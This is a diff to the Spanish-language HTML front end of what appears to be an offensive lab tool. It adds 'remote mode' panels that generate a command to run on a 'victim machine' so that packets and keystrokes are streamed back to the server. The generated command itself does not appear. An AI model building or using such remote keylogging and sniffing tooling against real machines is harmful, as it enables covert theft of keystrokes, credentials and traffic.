@@ -244,9 +244,47 @@
                     <!-- Submit -->
                     <button type="submit" id="sniff-btn" class="btn btn-sniff">
                         <span class="spinner" id="sniff-spinner"></span>
-                        <span class="btn-text">INICIAR CAPTURA</span>
+                        <span class="btn-text">INICIAR CAPTURA LOCAL</span>
                     </button>
                 </form>
+
+                <!-- ── MODO REMOTO ── -->
+                <div class="remote-mode-box">
+                    <div class="remote-mode-header" id="sniff-remote-toggle">
+                        <span>📡 Modo Remoto — Capturar desde otra máquina</span>
+                        <span class="remote-chevron" id="sniff-chevron">▶</span>
+                    </div>
+                    <div class="remote-mode-body" id="sniff-remote-body">
+                        <p class="remote-hint">Ejecuta el siguiente comando en la <strong>máquina víctima</strong> del laboratorio. El servidor recibirá los paquetes en tiempo real.</p>
+                        <div class="remote-form-row">
+                            <div class="form-group">
+                                <label class="form-label" for="sniff-remote-server-ip">IP de este Servidor</label>
+                                <input type="text" id="sniff-remote-server-ip" class="form-input" placeholder="Ej: 192.168.1.100" autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label" for="sniff-remote-count">Paquetes</label>
+                                <input type="number" id="sniff-remote-count" class="form-input" value="50" min="1" max="500">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label" for="sniff-remote-filter">Filtro</label>
+                                <select id="sniff-remote-filter" class="form-input">
+                                    <option value="all">Todos</option>
+                                    <option value="tcp">TCP</option>
+                                    <option value="udp">UDP</option>
+                                    <option value="icmp">ICMP</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="command-box" id="sniff-command-box">
+                            <code id="sniff-command-text">— ingresa la IP del servidor para generar el comando —</code>
+                            <button class="copy-cmd-btn" id="sniff-copy-cmd" title="Copiar comando">📋</button>
+                        </div>
+                        <button type="button" id="sniff-remote-btn" class="btn btn-sniff" style="margin-top: 0.75rem;">
+                            <span class="spinner" id="sniff-remote-spinner"></span>
+                            <span class="btn-text">⏳ ESPERAR AGENTE REMOTO</span>
+                        </button>
+                    </div>
+                </div>
 
                 <!-- Messages -->
                 <div id="sniff-message" class="message"></div>
@@ -352,9 +390,38 @@
                     <!-- Submit -->
                     <button type="submit" id="key-btn" class="btn btn-keylogger">
                         <span class="spinner" id="key-spinner"></span>
-                        <span class="btn-text">INICIAR KEYLOGGER</span>
+                        <span class="btn-text">INICIAR KEYLOGGER LOCAL</span>
                     </button>
                 </form>
+
+                <!-- ── MODO REMOTO ── -->
+                <div class="remote-mode-box">
+                    <div class="remote-mode-header" id="key-remote-toggle">
+                        <span>🌐 Modo Remoto — Capturar desde otra máquina</span>
+                        <span class="remote-chevron" id="key-chevron">▶</span>
+                    </div>
+                    <div class="remote-mode-body" id="key-remote-body">
+                        <p class="remote-hint">Ejecuta el siguiente comando en la <strong>máquina víctima</strong>. El servidor recibirá las teclas en tiempo real.</p>
+                        <div class="remote-form-row">
+                            <div class="form-group">
+                                <label class="form-label" for="key-remote-server-ip">IP de este Servidor</label>
+                                <input type="text" id="key-remote-server-ip" class="form-input" placeholder="Ej: 192.168.1.100" autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label" for="key-remote-duration">Duración (seg)</label>
+                                <input type="number" id="key-remote-duration" class="form-input" value="20" min="1" max="60">
+                            </div>
+                        </div>
+                        <div class="command-box" id="key-command-box">
+                            <code id="key-command-text">— ingresa la IP del servidor para generar el comando —</code>
+                            <button class="copy-cmd-btn" id="key-copy-cmd" title="Copiar comando">📋</button>
+                        </div>
+                        <button type="button" id="key-remote-btn" class="btn btn-keylogger" style="margin-top: 0.75rem;">
+                            <span class="spinner" id="key-remote-spinner"></span>
+                            <span class="btn-text">⏳ ESPERAR AGENTE REMOTO</span>
+                        </button>
+                    </div>
+                </div>
 
                 <!-- Messages -->
                 <div id="key-message" class="message"></div>
